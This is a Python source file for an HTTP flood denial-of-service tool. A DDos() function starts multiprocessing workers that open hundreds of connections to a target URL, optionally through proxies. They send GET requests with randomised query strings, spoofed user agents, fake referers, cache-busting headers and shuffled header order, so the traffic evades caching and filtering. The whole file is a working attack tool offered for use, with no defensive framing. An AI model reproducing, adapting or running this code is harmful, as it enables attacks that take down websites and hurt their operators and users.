from random import randint, shuffle, choice, random
from http.client import HTTPConnection, HTTPSConnection
from re import compile, match
from fake_useragent import UserAgent, FakeUserAgentError
ua, proxies, USER_AGENT_PARTS = UserAgent(), open(__file__.replace('__init__.py', 'proxies.txt')).readlines(), {'os': {'linux': {'name': ['Linux x86_64', 'Linux i386'], 'ext': ['X11']}, 'windows': {'name': ['Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT.6.2'], 'ext': ['WOW64', 'Win64; x64']}, 'mac': {'name': ['Macintosh'], 'ext': ['Intel Mac OS X %d_%d_%d' % (randint(10, 11), randint(0, 9), randint(0, 5)) for i in range(1, 10)]}}, 'platform': {'webkit': {'name': ['AppleWebKit/%d.%d' % (randint(535, 537), randint(1,36)) for i in range(1, 30)], 'details': ['KHTML, like Gecko'], 'extensions': ['Chrome/%d.0.%d.%d Safari/%d.%d' % (randint(6, 32), randint(100, 2000), randint(0, 100), randint(535, 537), randint(1, 36)) for i in range(1, 30) ] + [ 'Version/%d.%d.%d Safari/%d.%d' % (randint(4, 6), randint(0, 1), randint(0, 9), randint(535, 537), randint(1, 36)) for i in range(1, 10)]}, 'iexplorer': {'browser_info': {'name': ['MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0'], 'ext_pre': ['compatible', 'Windows; U'], 'ext_post': ['Trident/%d.0' % i for i in range(4, 6) ] + [ '.NET CLR %d.%d.%d' % (randint(1, 3), randint(0, 5), randint(1000, 30000)) for i in range(1, 10)]}}, 'gecko': {'name': ['Gecko/%d%02d%02d Firefox/%d.0' % (randint(2001, 2010), randint(1,31), randint(1,12) , randint(10, 25)) for i in range(1, 30)], 'details': [], 'extensions': []}}}
def checkUrl(url): return bool(match(compile(r'^(?:http)s?://(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?))', 2), url))
def checkProxy(proxy): return bool(match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5}$', proxy))
def DDos(url: str, sockets = 500, threads = 10, use_proxies = False, custom_proxies = None):
    global proxies
    assert checkUrl(url)
    if custom_proxies:
        for proxy in custom_proxies: assert checkProxy(proxy)
        proxies = custom_proxies
    workersQueue = [Striker(url, sockets, not i, threads, use_proxies) for i in range(threads)]
    for worker in workersQueue: worker.start()
    while workersQueue:
        try:
            for worker in workersQueue:
                if worker is not None and worker.is_alive(): worker.join(1)
                else: workersQueue.remove(worker)
        except (KeyboardInterrupt, SystemExit):
            for worker in workersQueue: worker.stop()
    print()
class Striker(__import__('multiprocessing').Process):
    def __init__(self, url, sockets, printer, threads, use_proxies):
        super(Striker, self).__init__()
        self.packets, self.socks, self.runnable, self.host, self.url, self.sockets, self.ssl, self.printer, self.threads, self.use_proxies = [0, 0], [], True, url.split("/")[2], "/".join(url.split("/")[3:]).split(";")[0].split("?")[0].split("#")[0], sockets, url.startswith('https'), printer, threads, use_proxies
    def __del__(self): self.stop()
    def run(self):
        while self.runnable:
            try:
                for _ in range(self.sockets): self.socks.append(HTTPConnection(choice(proxies).replace("\n", "")) if self.use_proxies else (HTTPSConnection(self.host) if self.ssl else HTTPConnection(self.host)))
                for conn_req in self.socks:
                    url, r_headers = self.generateData()
                    random_keys, headers = list(r_headers.keys()), {}
                    shuffle(random_keys)
                    for header_name in random_keys: headers[header_name] = r_headers[header_name]
                    conn_req.request("GET", (("https://" if self.ssl else "http://") + self.host + self.url) if self.use_proxies else url, None, headers)
                for conn_resp in self.socks:
                    conn_resp.getresponse()
                    self.packets[0] += 1
                for conn in self.socks: conn.close()
            except: self.packets[1] += 1
            if self.printer: print(f"{self.packets[0] * self.threads} packets got a response and {self.packets[1] * self.threads} died", end = "\r")
    def generateQueryString(self, ammount = 1): return '&'.join(["{0}={1}".format("".join([chr(choice(list(range(97, 122)) + list(range(65, 90)) + list(range(48, 57)))) for i in range(0, randint(3,10))]), "".join([chr(choice(list(range(97, 122)) + list(range(65, 90)) + list(range(48, 57)))) for i in range(0, randint(3,20))])) for i in range(ammount)])
    def generateData(self):
        param_joiner = "?"
        if not self.url: self.url = '/'
        if self.url.count("?"): param_joiner = "&"
        noCacheDirectives = ['no-cache', 'max-age=0']
        shuffle(noCacheDirectives)
        acceptEncoding = ['\'\'', '*', 'identity', 'gzip', 'deflate']
        shuffle(acceptEncoding)
        try: ua_string = ua.random
        except FakeUserAgentError:
            os = USER_AGENT_PARTS['os'][choice(list(USER_AGENT_PARTS['os'].keys()))]
            sysinfo, platform = choice(os['name']), USER_AGENT_PARTS['platform'][choice(list(USER_AGENT_PARTS['platform'].keys()))]
            if 'browser_info' in platform and platform['browser_info']:
                browser = platform['browser_info']
                browser_string = choice(browser['name'])
                if 'ext_pre' in browser: browser_string = "%s; %s" % (choice(browser['ext_pre']), browser_string)
                sysinfo = "%s; %s" % (browser_string, sysinfo)
                if 'ext_post' in browser: sysinfo = "%s; %s" % (sysinfo, choice(browser['ext_post']))
            if 'ext' in os and os['ext']: sysinfo = "%s; %s" % (sysinfo, choice(os['ext']))
            ua_string = "%s (%s)" % ("Mozilla/5.0", sysinfo)
            if 'name' in platform and platform['name']: ua_string = "%s %s" % (ua_string, choice(platform['name']))
            if 'details' in platform and platform['details']: ua_string = "%s (%s)" % (ua_string, choice(platform['details']) if len(platform['details']) > 1 else platform['details'][0] )
            if 'extensions' in platform and platform['extensions']: ua_string = "%s %s" % (ua_string, choice(platform['extensions']))
        http_headers = {'User-Agent': ua_string, 'Cache-Control': ', '.join(noCacheDirectives[:randint(1, (len(noCacheDirectives) - 1))]), 'Accept-Encoding': ', '.join(acceptEncoding[:randint(1, int(len(acceptEncoding) / 2))]), 'Connection': 'keep-alive', 'Keep-Alive': randint(1, 1000), 'Host': self.host}
        if randint(0, 1):
            acceptCharset = [ 'ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15', ]
            shuffle(acceptCharset)
            http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(acceptCharset[0], acceptCharset[1],round(random(), 1), round(random(), 1))
        if randint(0, 1): http_headers['Referer'] = choice(['http://www.google.com/', 'http://www.bing.com/', 'http://www.baidu.com/', 'http://www.yandex.com/', 'http://' + self.host + '/']) + "".join([chr(choice(list(range(97, 122)) + list(range(65, 90)) + list(range(48, 57)))) for i in range(0, randint(5, 10))]) + (('?' + self.generateQueryString(randint(1, 10))) if randint(0, 1) else "")
        if randint(0, 1): http_headers['Content-Type'] = choice(['multipart/form-data', 'application/x-url-encoded'])
        if randint(0, 1): http_headers['Cookie'] = self.generateQueryString(randint(1, 5))
        return (self.url + param_joiner + self.generateQueryString(randint(1, 5)), http_headers)
    def stop(self):
        self.runnable = False
        for conn in self.socks: conn.close()
        self.terminate()
